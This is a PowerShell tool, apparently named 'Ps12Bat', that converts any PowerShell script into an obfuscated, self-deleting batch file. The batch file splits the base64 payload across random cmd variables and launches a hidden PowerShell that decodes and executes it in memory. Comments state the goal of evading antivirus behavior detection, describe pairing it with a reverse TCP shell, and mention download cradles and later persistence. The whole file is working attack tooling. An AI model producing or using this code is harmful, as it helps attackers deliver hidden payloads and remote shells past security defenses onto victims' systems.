# This version does not create a base 64 encoded temp file, it loads strings 
# into a variable then decodes it and executes it in memory the only file 
# is the .bat file. Additional cmd command type obfuscation will be added to 
# clear text command string. This change was done to further evade AV behavior 
# detection engines. The down side to this method is that there is a 
# limitation on how much encoded characters can be included inline. I also added
# a stripped down version of the reverse tcp client "rsh.ps1" which fits this 
# requirement on win 7 and 8.1 have not tested 10 yet.
#
# xor-function
  

function b64enc {
	param($string)
	# Use this to encode strings to base64 format
	$encstring = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($string))
	return $encstring
}
function gen-enccmd {
	param($clrcmd)
	$bytescmd = [System.Text.Encoding]::Unicode.GetBytes($clrcmd.ToString())
	$enccmd = [Convert]::ToBase64String($bytescmd)
	return $enccmd
}
function b64dec {
	param($encstring)
	# Don't have to worry about unsafe url characters since it's content not a url string
	$decstring = [System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String($encstring))
	return $decstring
}
function rand-str {
	$rint = get-random -max 10 -min 3
	$charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
	1..$rint | % { $rchr += $charArray | get-random }
	$randstr = [string]::join("", ($rchr))
	return $randstr
}
function genenc-script {
	Param(
		[Parameter(Mandatory=$true, Position=0)]
		[Alias('LiteralPath')]
		[string[]]$script
	)
	$scriptpath = Get-Item -LiteralPath $script
	$s = ($scriptpath.FullName)
	$sname = ($scriptpath.Name)
   	$encscript = b64enc $(get-content $s | out-string )
	$newline = "`r`n"
	$cmdstrArray = @()
	[int]$lineccnt = '0'
	[int]$loop = '0'
	$charArray = $encscript.ToCharArray()
	$randvarArray = @()
	[int]$total = $charArray.count
	[int]$loopccnt = '0'
	foreach ($char in $charArray)
	{
		$loopccnt++;$lineccnt++;$loop++	
		if ( [int]$lineccnt -eq '1' ) 
		{
			$randvar = rand-str
			$randvarArray += $randvar
			$cmdfile += 'set ' + $randvar +'='+ $char
		} else {$cmdfile += $char }
		if ($loopccnt -ne $total) { if ($loop -eq '120' ) {  $cmdfile += $newline; [int]$lineccnt = 0 ; [int]$loop = 0 }
		} else { $cmdfile += $newline }
			
	}
    [int]$cnt = 1
    foreach ( $randvar in $randvarArray )
    {
		if ( $cnt -eq '1' )
		{
			$mainRvar = rand-str
			$cmdfile += $newline
			$cmdfile += 'set ' + $mainRvar + '=' + '%' + $randvar + '%'
		} else { $cmdfile += '%' + $randvar + '%' }
		$cnt++
	}
    $cmdfile += $newline
	$randparam = rand-str
	$rvar = rand-str
	$cmdfile += 'start powershell -w hidden icm{param($'+$randparam+');$'+$rvar+'=[System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String($'+$randparam+'));iex $'+$rvar+'}-args %'+ $mainRvar + '%' + $newline
	$cmdfile += 'DEL "%~f0"' + $newline
	$cmdfile += 'exit' + $newline
	write-output "[+] Generating encoded script block ready for batch file use ..."
	$randbat = rand-str 
	$batchfileName = $randbat + '.bat'
	$path = (Get-Item -Path ".\").FullName
	$filepath = $path + '\' + $batchfileName
	set-content $filepath $cmdfile -Encoding ASCII
	write-output "[+] Saved batch file to: $filepath "
	write-output "============================================================================"
}
function main {
	# Any persistence will have to be loaded after you get a shell or code exec to prevent AV 
	# from being tripped. Also instead of a reverse shell you can use a download cradle to retrieve
	# code, unfortunately this seem to be the only simple way to keep code off disk.
	write-output "[>] Ps12Bat userland exec"
	write-output "============================================================================"
	$pshPath = ''
	$pshPath = read-host -prompt "[+] Enter path to powershell script "
	genenc-script $pshPath
}
main
